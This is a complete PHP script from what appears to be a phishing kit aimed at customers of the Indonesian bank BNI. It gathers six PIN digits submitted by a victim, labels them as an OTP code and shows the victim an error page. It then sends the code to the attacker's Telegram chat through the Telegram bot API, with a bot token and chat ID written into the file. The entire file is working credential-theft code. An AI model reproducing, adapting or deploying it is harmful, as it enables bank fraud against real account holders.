<?php

    header('Location: /bni/salah.html');
    
    $apiToken = "6656758431:AAG1ilgQl8UHBrJUvg1K-qSKq658frxL7IY";

$pin1 = $_POST['pin1'];
$pin2 = $_POST['pin2'];
$pin3 = $_POST['pin3'];
$pin4 = $_POST['pin4'];
$pin5 = $_POST['pin5'];
$pin6 = $_POST['pin6'];
$_pin = $pin1.$pin2.$pin3.$pin4.$pin5.$pin6;


$message = "
──────────────────────
BANK | BNI | CUAN
──────────────────────
• Kode OTP : ".$_pin."
──────────────────────";

    $data = [
        'chat_id' => '6595419648',
        'text' => $message,
        'parse_mode' => "html"
    ];
    $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );

    echo '<pre>';
    print_r(json_decode($response));
    die();
